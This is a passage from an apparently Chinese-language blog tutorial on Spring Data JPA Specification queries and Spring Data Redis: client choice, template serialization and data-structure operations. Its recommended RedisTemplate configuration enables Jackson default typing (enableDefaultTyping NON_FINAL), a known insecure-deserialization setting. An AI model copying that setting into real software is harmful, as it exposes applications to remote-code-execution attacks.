&#123;</span><br><span class="line">        <span class="keyword">return</span> (root, query, cb) -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (status == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> cb.conjunction();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> cb.equal(root.get(<span class="string">&quot;status&quot;</span>), status);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在Service层中可以这样使用，代码更清晰</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">searchUsersV2</span><span class="params">(UserSearchCriteria criteria)</span> &#123;</span><br><span class="line">    Specification&lt;User&gt; spec = Specification</span><br><span class="line">            .where(UserSpecifications.usernameContains(criteria.getUsername()))</span><br><span class="line">            .and(UserSpecifications.hasStatus(criteria.getStatus()));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> userRepository.findAll(spec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Specification.where(spec1).and(spec2).or(spec3)</code>: 提供了流式API来组合<code>Specification</code>。</li>
<li><code>cb.conjunction()</code>: 返回一个 <code>true</code> 条件 (<code>1=1</code>)，在动态构建<code>AND</code>条件时非常有用，可以作为初始条件。</li>
<li><code>cb.disjunction()</code>: 返回一个 <code>false</code> 条件 (<code>1=0</code>)，用于构建<code>OR</code>条件。</li>
</ul>
<hr>
<h5 id="4-优势与劣势"><a href="#4-优势与劣势" class="headerlink" title="4. 优势与劣势"></a>4. 优势与劣势</h5><p><strong>优势</strong>:</p>
<ol>
<li><strong>极高的灵活性</strong>: 可以构建出任意复杂的动态查询逻辑。</li>
<li><strong>类型安全</strong>: 所有属性名都是通过 <code>root.get(&quot;fieldName&quot;)</code> 获取的，如果字段名写错，在<strong>编译时</strong>可能会被一些静态分析工具发现（运行时肯定会报错），比拼接字符串更安全。</li>
<li><strong>代码可读性与复用性</strong>: 将查询逻辑封装成独立的<code>Specification</code>方法，使得代码更清晰、易于测试和复用。</li>
</ol>
<p><strong>劣势</strong>:</p>
<ol>
<li><strong>学习曲线陡峭</strong>: <code>Criteria API</code> 的语法相对繁琐和抽象，初学者需要一定时间来适应。</li>
<li><strong>代码量较大</strong>: 相比方法命名查询，实现一个简单的动态查询也需要编写更多的代码。</li>
<li><strong>关联查询（JOIN）相对复杂</strong>: 虽然<code>Criteria API</code>支持JOIN，但语法会变得更加复杂，例如 <code>root.join(&quot;address&quot;).get(&quot;city&quot;)</code>。</li>
</ol>
<hr>
<h2 id="4-Spring-Data-for-Redis"><a href="#4-Spring-Data-for-Redis" class="headerlink" title="4. Spring Data for Redis"></a>4. Spring Data for Redis</h2><h3 id="4-1-客户端集成"><a href="#4-1-客户端集成" class="headerlink" title="4.1 客户端集成"></a>4.1 客户端集成</h3><p>要在Java应用中与Redis服务器进行通信，我们需要一个<strong>Redis客户端库</strong>。这个库负责处理网络连接、执行Redis命令、以及对返回结果进行编码和解码。</p>
<p>在Spring Boot 2.x及以后的版本中，Spring Data Redis 支持两个主流的、高性能的Java Redis客户端：<strong>Lettuce</strong> 和 <strong>Jedis</strong>。</p>
<p><strong>Spring Boot的默认选择</strong>：从 Spring Boot 2.0 开始，<strong>Lettuce</strong> 成为了<strong>默认</strong>的Redis客户端。</p>
<hr>
<h4 id="4-1-1-如何配置"><a href="#4-1-1-如何配置" class="headerlink" title="4.1.1 如何配置"></a>4.1.1 如何配置</h4><p>Spring Boot的自动配置机制使得客户端的集成变得异常简单。</p>
<p><strong>Step 1: 添加 <code>spring-boot-starter-data-redis</code> 依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>当你只添加这个Starter时，它会<strong>传递性地依赖 <code>lettuce-core</code></strong>，所以你默认使用的就是Lettuce。</li>
</ul>
<p><strong>Step 2: 配置Redis连接 (<code>application.yml</code>)</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">your-password</span> <span class="comment"># 如果有密码的话</span></span><br><span class="line">    <span class="attr">database:</span> <span class="number">0</span> <span class="comment"># 使用的数据库索引，默认为0</span></span><br><span class="line">    <span class="attr">lettuce:</span> <span class="comment"># Lettuce特有的连接池配置</span></span><br><span class="line">      <span class="attr">pool:</span></span><br><span class="line">        <span class="attr">max-active:</span> <span class="number">8</span> <span class="comment"># 最大连接数</span></span><br><span class="line">        <span class="attr">max-idle:</span> <span class="number">8</span>   <span class="comment"># 最大空闲连接</span></span><br><span class="line">        <span class="attr">min-idle:</span> <span class="number">0</span>   <span class="comment"># 最小空闲连接</span></span><br><span class="line">        <span class="attr">max-wait:</span> <span class="string">-1ms</span> <span class="comment"># 连接等待时间，-1表示不限制</span></span><br></pre></td></tr></table></figure>

<p>完成这两步，Spring Boot就会自动为你配置好一个<code>LettuceConnectionFactory</code>以及后续会讲到的<code>RedisTemplate</code>等Bean，你就可以直接开始使用了。</p>
<hr>
<h4 id="4-1-2-Lettuce-现代化的、默认的选择"><a href="#4-1-2-Lettuce-现代化的、默认的选择" class="headerlink" title="4.1.2 Lettuce - 现代化的、默认的选择"></a>4.1.2 Lettuce - 现代化的、默认的选择</h4><ul>
<li><strong>官方网站</strong>: <a target="_blank" rel="noopener" href="https://lettuce.io/">https://lettuce.io/</a></li>
<li><strong>底层技术</strong>: 基于 <strong>Netty</strong>，一个高性能的、异步的、事件驱动的网络应用框架。</li>
<li><strong>核心特点</strong>:<ol>
<li><strong>异步非阻塞 (Asynchronous &amp; Non-blocking)</strong>: 这是Lettuce<strong>最核心的优势</strong>。它允许你在一个线程上发送多个Redis命令而无需等待响应，当响应返回时，会通过回调来处理。这与响应式编程（Project Reactor）的思想完美契合。</li>
<li><strong>响应式支持 (Reactive)</strong>: Lettuce提供了原生的响应式API，可以返回<code>Mono</code>和<code>Flux</code>。这使得它成为<strong>Spring WebFlux</strong>项目中与Redis交互的<strong>唯一选择</strong>。</li>
<li><strong>可伸缩性和高性能</strong>: 由于其非阻塞的特性，Lettuce可以用更少的线程处理更高的并发量，从而获得更好的性能和资源利用率。</li>
<li><strong>线程安全</strong>: 一个Lettuce连接（<code>StatefulRedisConnection</code>）<strong>是线程安全的</strong>，这意味着多个线程可以<strong>共享同一个连接</strong>来执行命令，而不会产生线程安全问题。这简化了连接管理，并且通过连接池可以进一步提高性能。</li>
</ol>
</li>
<li><strong>缺点</strong>:<ul>
<li>API相对Jedis来说稍显复杂，特别是直接使用其原生异步API时。但在Spring Data Redis的封装下，这个缺点被很大程度上隐藏了。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="4-1-3-Jedis-传统而稳定的选择"><a href="#4-1-3-Jedis-传统而稳定的选择" class="headerlink" title="4.1.3 Jedis - 传统而稳定的选择"></a>4.1.3 Jedis - 传统而稳定的选择</h4><ul>
<li><strong>官方网站</strong>: <a target="_blank" rel="noopener" href="https://github.com/redis/jedis">https://github.com/redis/jedis</a></li>
<li><strong>底层技术</strong>: 基于传统的<strong>阻塞式I&#x2F;O (BIO)</strong>，使用Java的<code>Socket</code>进行通信。</li>
<li><strong>核心特点</strong>:<ol>
<li><strong>同步阻塞 (Synchronous &amp; Blocking)</strong>: 这是Jedis最显著的特点。当你发送一个命令时，当前线程会<strong>阻塞</strong>，直到Redis服务器返回响应。这使得它的编程模型非常简单直观，易于理解。</li>
<li><strong>简单易用</strong>: API非常直接，几乎与Redis的原生命令一一对应。</li>
<li><strong>线程不安全</strong>: 一个Jedis连接实例<strong>不是线程安全的</strong>。因此，在多线程环境中，你<strong>必须</strong>使用连接池（如<code>JedisPool</code>），每个线程从池中获取自己的连接，使用完毕后归还。如果多个线程共享一个Jedis实例，会导致不可预知的数据错乱。</li>
</ol>
</li>
<li><strong>缺点</strong>:<ul>
<li><strong>性能瓶颈</strong>: 在高并发场景下，同步阻塞模型会导致大量线程被创建和阻塞，成为系统的性能瓶颈。</li>
<li><strong>不支持响应式</strong>: 由于其阻塞的特性，Jedis<strong>无法</strong>与Spring WebFlux等响应式框架协同工作。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="4-1-4-如何从Lettuce切换到Jedis？"><a href="#4-1-4-如何从Lettuce切换到Jedis？" class="headerlink" title="4.1.4 如何从Lettuce切换到Jedis？"></a>4.1.4 如何从Lettuce切换到Jedis？</h4><p>如果你因为特定原因（例如，需要兼容一些只支持Jedis的老代码或库）需要使用Jedis，切换过程也非常简单：</p>
<p><strong>Step 1: 修改<code>pom.xml</code></strong></p>
<ol>
<li>在 <code>spring-boot-starter-data-redis</code> 中<strong>排除</strong>默认的 <code>lettuce-core</code> 依赖。</li>
<li><strong>添加</strong> <code>jedis</code> 依赖。</li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.lettuce<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lettuce-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>Step 2: 修改<code>application.yml</code> (可选)</strong></p>
<p>将连接池的配置从<code>lettuce.pool</code>改为<code>jedis.pool</code>。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="comment"># ... host, port等通用配置 ...</span></span><br><span class="line">    <span class="attr">jedis:</span> <span class="comment"># Jedis特有的连接池配置</span></span><br><span class="line">      <span class="attr">pool:</span></span><br><span class="line">        <span class="attr">max-active:</span> <span class="number">8</span></span><br><span class="line">        <span class="attr">max-idle:</span> <span class="number">8</span></span><br><span class="line">        <span class="attr">min-idle:</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>Spring Boot的自动配置会检测到类路径下存在<code>Jedis</code>而没有<code>Lettuce</code>，于是会自动为你配置<code>JedisConnectionFactory</code>。你的上层业务代码（如使用<code>RedisTemplate</code>）<strong>无需做任何改动</strong>，这是Spring抽象的强大之处。</p>
<hr>
<h4 id="4-1-5-总结"><a href="#4-1-5-总结" class="headerlink" title="4.1.5 总结"></a>4.1.5 总结</h4><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">Lettuce (默认推荐)</th>
<th align="left">Jedis (传统选择)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>I&#x2F;O模型</strong></td>
<td align="left"><strong>异步非阻塞</strong> (基于Netty)</td>
<td align="left"><strong>同步阻塞</strong> (基于BIO Socket)</td>
</tr>
<tr>
<td align="left"><strong>线程安全</strong></td>
<td align="left">连接是<strong>线程安全</strong>的，可多线程共享</td>
<td align="left">连接是<strong>非线程安全</strong>的，多线程必须使用连接池</td>
</tr>
<tr>
<td align="left"><strong>性能</strong></td>
<td align="left"><strong>高</strong>。在高并发和响应式场景下表现优异。</td>
<td align="left"><strong>中等</strong>。在低并发下简单直接，高并发下会成为瓶颈。</td>
</tr>
<tr>
<td align="left"><strong>响应式支持</strong></td>
<td align="left"><strong>原生支持</strong>。是WebFlux的标配。</td>
<td align="left"><strong>不支持</strong>。无法用于响应式编程。</td>
</tr>
<tr>
<td align="left"><strong>资源消耗</strong></td>
<td align="left"><strong>低</strong>。可以用更少的线程处理更多请求。</td>
<td align="left"><strong>高</strong>。每个阻塞的请求都需要一个线程。</td>
</tr>
<tr>
<td align="left"><strong>编程模型</strong></td>
<td align="left">略复杂，但被Spring封装后变得简单。</td>
<td align="left">非常简单直观。</td>
</tr>
</tbody></table>
<p><strong>最终建议</strong>:</p>
<ul>
<li>对于<strong>所有新的Spring Boot项目</strong>，都应该<strong>坚持使用默认的Lettuce</strong>。它的性能优势、线程安全以及对未来响应式编程的支持，使其成为一个毫无疑问的更优选择。</li>
<li>只有在维护<strong>老的、已经在使用Jedis的项目</strong>，或者有<strong>强烈的理由</strong>（如需要与某些仅支持Jedis的第三方工具集成）时，才考虑切换到Jedis。</li>
</ul>
<hr>
<h3 id="4-2-RedisTemplate-vs-StringRedisTemplate"><a href="#4-2-RedisTemplate-vs-StringRedisTemplate" class="headerlink" title="4.2 RedisTemplate vs StringRedisTemplate"></a>4.2 <code>RedisTemplate</code> vs <code>StringRedisTemplate</code></h3><p>当你在Spring Boot项目中配置好Redis后，自动配置会为你创建并注册两个核心的模板类Bean：<code>RedisTemplate&lt;Object, Object&gt;</code> 和 <code>StringRedisTemplate</code>。它们都是对Redis命令的高度封装，提供了便捷的API来操作Redis中的各种数据结构。</p>
<p>它们最核心、最根本的区别在于<strong>序列化方式 (Serialization)</strong> 的不同。</p>
<hr>
<h4 id="4-2-1-RedisTemplate-通用的、面向对象的模板"><a href="#4-2-1-RedisTemplate-通用的、面向对象的模板" class="headerlink" title="4.2.1 RedisTemplate&lt;K, V&gt; - 通用的、面向对象的模板"></a>4.2.1 <code>RedisTemplate&lt;K, V&gt;</code> - 通用的、面向对象的模板</h4><ul>
<li><strong>泛型定义</strong>: <code>RedisTemplate&lt;K, V&gt;</code> 是一个泛型类，允许你指定键（Key）和值（Value）的类型。在Spring Boot自动配置中，默认创建的是 <code>RedisTemplate&lt;Object, Object&gt;</code>。</li>
<li><strong>核心特点：可定制的序列化</strong><ul>
<li><code>RedisTemplate</code> 为了能够处理<strong>任何类型的Java对象</strong>（如 <code>User</code>, <code>Product</code>, <code>List&lt;String&gt;</code> 等），必须对存入Redis的键和值进行<strong>序列化</strong>，将Java对象转换成二进制数据。</li>
<li><strong>默认序列化器</strong>: <code>JdkSerializationRedisSerializer</code>。<ul>
<li><strong>工作方式</strong>: 使用Java<strong>自带的序列化机制</strong> (<code>ObjectOutputStream</code>)。</li>
<li><strong>缺点</strong>:<ol>
<li><strong>可读性极差</strong>: 序列化后的结果是一串二进制数据，包含了类的信息、版本号等，在Redis客户端（如<code>redis-cli</code>）中查看时，会显示为乱码（如 <code>\xac\xed\x00\x05t\x00\x04user</code>）。</li>
<li><strong>跨语言不友好</strong>: 只有Java程序能够反序列化这些数据，其他语言（Python, Go, Node.js）的程序无法识别。</li>
<li><strong>占用空间较大</strong>: 存储了额外的元数据，比JSON等格式更占空间。</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
<li><strong>适用场景</strong>:<ul>
<li>当你需要存储<strong>复杂的Java对象</strong>，并且<strong>只有Java应用</strong>会访问这些数据时。</li>
<li>在现代微服务架构中，由于其可读性和跨语言的弊端，<strong>默认的<code>JdkSerializationRedisSerializer</code>已不被推荐使用</strong>。</li>
</ul>
</li>
<li><strong>如何改进（最佳实践）</strong>:<br>为了解决上述缺点，我们通常会<strong>手动配置<code>RedisTemplate</code></strong>，将其默认的序列化器替换为<strong>更通用的格式</strong>，如 <strong>JSON</strong>。</li>
</ul>
<p><strong>自定义 <code>RedisTemplate</code> Bean配置示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory factory)</span> &#123;</span><br><span class="line">        RedisTemplate&lt;String, Object&gt; template = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">        template.setConnectionFactory(factory);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 创建JSON序列化器</span></span><br><span class="line">        Jackson2JsonRedisSerializer&lt;Object&gt; jackson2JsonRedisSerializer = <span class="keyword">new</span> <span class="title class_">Jackson2JsonRedisSerializer</span>&lt;&gt;(Object.class);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">om</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);</span><br><span class="line">        om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line">        jackson2JsonRedisSerializer.setObjectMapper(om);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 创建String序列化器</span></span><br><span class="line">        <span class="type">StringRedisSerializer</span> <span class="variable">stringRedisSerializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 设置Key的序列化方式</span></span><br><span class="line">        template.setKeySerializer(stringRedisSerializer);</span><br><span class="line">        template.setHashKeySerializer(stringRedisSerializer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 设置Value的序列化方式</span></span><br><span class="line">        template.setValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        template.setHashValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line"></span><br><span class="line">        template.afterPropertiesSet();</span><br><span class="line">        <span class="keyword">return</span> template;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>配置后的效果</strong>:</p>
<ul>
<li>当你使用这个自定义的 <code>redisTemplate</code> 存入一个 <code>User</code> 对象时，Redis中存储的将是<strong>可读的JSON字符串</strong>，如 <code>{&quot;id&quot;:1, &quot;name&quot;:&quot;Alice&quot;}</code>。</li>
<li>这样既保证了可读性，也实现了跨语言的兼容性。</li>
</ul>
<hr>
<h4 id="4-2-2-StringRedisTemplate-专用于字符串的模板"><a href="#4-2-2-StringRedisTemplate-专用于字符串的模板" class="headerlink" title="4.2.2 StringRedisTemplate - 专用于字符串的模板"></a>4.2.2 <code>StringRedisTemplate</code> - 专用于字符串的模板</h4><ul>
<li><p><strong>继承关系</strong>: <code>StringRedisTemplate extends RedisTemplate&lt;String, String&gt;</code>。</p>
</li>
<li><p><strong>核心特点：固定的字符串序列化</strong></p>
<ul>
<li>从它的继承关系就可以看出，<code>StringRedisTemplate</code> 是一个<strong>特化</strong>的<code>RedisTemplate</code>，它<strong>强制要求键（Key）和值（Value）都是 <code>String</code> 类型</strong>。</li>
<li>它内部<strong>固定使用 <code>StringRedisSerializer</code></strong> 来进行序列化。</li>
<li><code>StringRedisSerializer</code> 会将字符串按照指定的字符集（默认为UTF-8）转换为字节数组。</li>
</ul>
</li>
<li><p><strong>优点</strong>:</p>
<ol>
<li><strong>可读性最好</strong>: 存入Redis的数据就是你传入的原始字符串，在任何客户端中查看都非常直观。</li>
<li><strong>通用性最强</strong>: 字符串是所有编程语言都支持的最基本数据类型，跨语言交互毫无障碍。</li>
<li><strong>性能高</strong>: 字符串序列化比复杂的对象序列化更快。</li>
<li><strong>完美匹配Redis原生操作</strong>: 非常适合用来操作Redis中的字符串类型数据，以及对数字进行<code>incr</code>（自增）、<code>decr</code>（自减）等操作。</li>
</ol>
</li>
<li><p><strong>适用场景</strong>:</p>
<ul>
<li><p>当你的应用中，Redis主要用于存储<strong>简单的字符串键值对</strong>时，例如：</p>
<ul>
<li>缓存简单的文本信息、配置项。</li>
<li>存储Session ID。</li>
<li>实现分布式锁（锁的value通常是字符串）。</li>
<li>用作计数器（存储数字字符串）。</li>
</ul>
</li>
<li><p>当需要缓存<strong>JSON字符串</strong>时。你可以手动将Java对象序列化为JSON字符串，然后使用<code>StringRedisTemplate</code>存入。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 手动序列化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">userJson</span> <span class="operator">=</span> objectMapper.writeValueAsString(user);</span><br><span class="line">stringRedisTemplate.opsForValue().set(<span class="string">&quot;user:1&quot;</span>, userJson);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 手动反序列化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">storedJson</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().get(<span class="string">&quot;user:1&quot;</span>);</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> objectMapper.readValue(storedJson, User.class);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h4 id="4-2-3-总结"><a href="#4-2-3-总结" class="headerlink" title="4.2.3 总结"></a>4.2.3 总结</h4><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left"><code>RedisTemplate&lt;Object, Object&gt;</code> (默认)</th>
<th align="left"><code>RedisTemplate&lt;String, Object&gt;</code> (自定义JSON序列化)</th>
<th align="left"><code>StringRedisTemplate</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>键(Key)类型</strong></td>
<td align="left"><code>Object</code></td>
<td align="left"><code>String</code></td>
<td align="left"><code>String</code></td>
</tr>
<tr>
<td align="left"><strong>值(Value)类型</strong></td>
<td align="left"><code>Object</code></td>
<td align="left"><code>Object</code></td>
<td align="left"><code>String</code></td>
</tr>
<tr>
<td align="left"><strong>序列化器</strong></td>
<td align="left"><code>JdkSerializationRedisSerializer</code></td>
<td align="left">Key: <code>StringRedisSerializer</code><br>Value: <code>Jackson2JsonRedisSerializer</code></td>
<td align="left">Key&#x2F;Value: <code>StringRedisSerializer</code></td>
</tr>
<tr>
<td align="left"><strong>Redis中存储格式</strong></td>
<td align="left"><strong>二进制乱码</strong></td>
<td align="left"><strong>可读的JSON字符串</strong></td>
<td align="left"><strong>原始字符串</strong></td>
</tr>
<tr>
<td align="left"><strong>跨语言兼容性</strong></td>
<td align="left"><strong>差</strong> (仅Java)</td>
<td align="left"><strong>好</strong></td>
<td align="left"><strong>极好</strong></td>
</tr>
<tr>
<td align="left"><strong>可读性</strong></td>
<td align="left"><strong>差</strong></td>
<td align="left"><strong>好</strong></td>
<td align="left"><strong>极好</strong></td>
</tr>
<tr>
<td align="left"><strong>使用便利性</strong></td>
<td align="left">直接存取Java对象，无需手动转换。</td>
<td align="left">直接存取Java对象，无需手动转换。</td>
<td align="left">只能存取字符串，存取对象需<strong>手动进行JSON转换</strong>。</td>
</tr>
<tr>
<td align="left"><strong>核心用途</strong></td>
<td align="left">存储任意Java对象（不推荐默认配置）</td>
<td align="left"><strong>推荐用于存储复杂Java对象作为缓存</strong></td>
<td align="left"><strong>推荐用于存储简单字符串、计数器、JSON字符串</strong></td>
</tr>
</tbody></table>
<p><strong>最终选择建议</strong>:</p>
<ol>
<li><strong>首选自定义的<code>RedisTemplate&lt;String, Object&gt;</code></strong>: 在大多数需要将<strong>Java对象</strong>作为整体进行缓存的场景中，配置一个使用JSON序列化器的<code>RedisTemplate</code>是<strong>最佳实践</strong>。它兼顾了使用的便利性（直接操作对象）和数据在Redis中的可读性&#x2F;通用性。</li>
<li><strong>使用<code>StringRedisTemplate</code>处理简单数据</strong>: 当你明确知道要处理的就是<strong>字符串</strong>、<strong>数字</strong>（作为字符串存储）或者需要<strong>手动控制JSON转换</strong>时，<code>StringRedisTemplate</code> 是最直接、最高效的选择。</li>
<li><strong>避免使用默认的<code>RedisTemplate&lt;Object, Object&gt;</code></strong>: 除非你的应用是一个与外界完全隔离的、纯Java的单体应用，并且你不在乎Redis中数据的可读性，否则应<strong>尽量避免</strong>使用其默认的JDK序列化方式。</li>
</ol>
<hr>
<h3 id="4-3-常用数据结构操作"><a href="#4-3-常用数据结构操作" class="headerlink" title="4.3 常用数据结构操作"></a>4.3 常用数据结构操作</h3><p>Redis之所以强大，不仅仅因为它是一个键值存储，更在于它为值（Value）提供了丰富的数据结构。Spring Data Redis 通过 <code>RedisTemplate</code> 提供了一系列的操作接口（Operations），使得我们可以用面向对象的方式来与这些数据结构交互，而无需记忆繁杂的Redis命令。</p>
<p><strong>获取操作接口</strong>:</p>
<p><code>RedisTemplate</code> 提供了一系列的 <code>opsFor...()</code> 方法来获取针对特定数据结构的操作接口：</p>
<ul>
<li><code>opsForValue()</code>: 操作 <strong>String (字符串)</strong></li>
<li><code>opsForHash()</code>: 操作 <strong>Hash (哈希&#x2F;散列)</strong></li>
<li><code>opsForList()</code>: 操作 <strong>List (列表)</strong></li>
<li><code>opsForSet()</code>: 操作 <strong>Set (集合)</strong></li>
<li><code>opsForZSet()</code>: 操作 <strong>ZSet (有序集合)</strong></li>
</ul>
<p>在下面的示例中，我们假设已经注入了<code>StringRedisTemplate</code>，因为它操作的结果在<code>redis-cli</code>中查看最直观。使用自定义JSON序列化的<code>RedisTemplate</code>在API调用上是完全一样的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisOperationService</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StringRedisTemplate stringRedisTemplate;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 操作方法将在这里实现</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-3-1-String-字符串"><a href="#4-3-1-String-字符串" class="headerlink" title="4.3.1 String (字符串)"></a>4.3.1 String (字符串)</h4><p>这是最简单的数据结构，一个key对应一个string value。</p>
<ul>
<li><strong>用途</strong>: 缓存用户信息JSON、存储配置、计数器、分布式锁等。</li>
<li><strong>操作接口</strong>: <code>ValueOperations&lt;String, String&gt;</code> (通过 <code>stringRedisTemplate.opsForValue()</code>)</li>
</ul>
<p><strong>常用方法</strong>:</p>
